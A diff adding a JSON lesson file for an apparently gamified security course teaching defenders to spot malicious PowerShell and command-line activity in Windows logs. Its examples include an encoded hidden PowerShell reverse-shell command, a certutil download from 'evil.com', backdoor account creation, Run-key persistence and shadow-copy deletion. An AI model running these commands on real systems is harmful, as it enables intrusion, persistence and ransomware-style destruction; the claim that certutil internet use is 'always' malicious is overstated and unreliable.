@@ -1,0 +1,68 @@
+{
+    "id": "l4",
+    "chapterId": "ch_4",
+    "title": "PowerShell & Command Line Logging",
+    "description": "Tracking script execution and suspicious commands.",
+    "xpReward": 30,
+    "estimatedMinutes": 8,
+    "section": "Windows",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "PowerShell: The Attacker's Swiss Army Knife 🛠️",
+            "content": "# Why Attackers Love PowerShell\n\nPowerShell is a powerful scripting language built into every Windows machine since Windows 7. Attackers use it because:\n\n*   **It's trusted.** Antivirus often ignores PowerShell scripts.\n*   **It's 'Living off the Land' (LotL).** No need to drop `malware.exe`; just use what's already there.\n*   **It can load code directly into memory.** No files are written to disk, evading traditional AV scans.\n\n**Defensive Countermeasure:** **Script Block Logging** (Event ID 4104). If enabled, Windows logs the **actual text of the PowerShell script** being executed."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "code",
+            "title": "Decoding Base64 PowerShell 🔓",
+            "content": "Attackers often use the `-EncodedCommand` flag to obfuscate their scripts. This turns the script into a long Base64 string.",
+            "codeSnippet": "# Malicious Command Line Example:\npowershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADMANAApADsA\n\n# Your Job: Recognize the '-Enc' flag and decode it.\n# Decoded (Using CyberChef or PowerShell):\n$client = New-Object System.Net.Sockets.TCPClient(\"192.168.1.100\",4434);\n# That's a Reverse Shell!",
+            "codeLanguage": "powershell",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_3",
+            "type": "quiz",
+            "title": "PowerShell Flag 🚩",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "You see the command: `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File script.ps1`. What is the intent?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Run a script with minimal user visibility and bypass security restrictions.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Update Windows Defender.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Connect to a network printer.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`Bypass` ignores script signing policies. `Hidden` hides the window. This is a hallmark of malicious PowerShell execution.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_4",
+            "type": "text",
+            "title": "Command Line Auditing (Event ID 4688) 🔍",
+            "content": "# The 'CmdLine' Field\n\nWe saw Event ID 4688 in L2. The **Process Command Line** field is where the magic happens.\n\n**Examples of Suspicious Command Lines:**\n\n| Command Line Snippet | What It Means |\n| :--- | :--- |\n| `net user hacker P@ssw0rd /add` | Creating a new local user account. |\n| `net localgroup administrators hacker /add` | Adding that user to the Admin group. |\n| `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` | Adding persistence via the Registry. |\n| `rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"` | **Highly suspicious.** Execution of script via Rundll32. |\n| `vssadmin delete shadows /all` | Deleting Volume Shadow Copies (Ransomware prep). |"
+        },
+        {
+            "id": "s_l4_5",
+            "type": "warning",
+            "title": "Living Off the Land Binaries (LOLBins) ⚠️",
+            "content": "## Trusted Tools, Malicious Purpose\n\nAttackers use signed, legitimate Microsoft executables for evil. These are called **LOLBins**. Knowing their names is key.\n\n*   **`rundll32.exe`:** Executes code from a DLL.\n*   **`regsvr32.exe`:** Registers/unregisters DLLs (can execute remote scripts).\n*   **`mshta.exe`:** Executes HTML Applications (`.hta` files).\n*   **`certutil.exe`:** Used for certificate management... **AND downloading files from the internet** (`certutil -urlcache -split -f http://evil.com/payload.exe`).\n\nIf you see `certutil` connecting to the internet, it's **always** malicious."
+        }
+    ]
+}
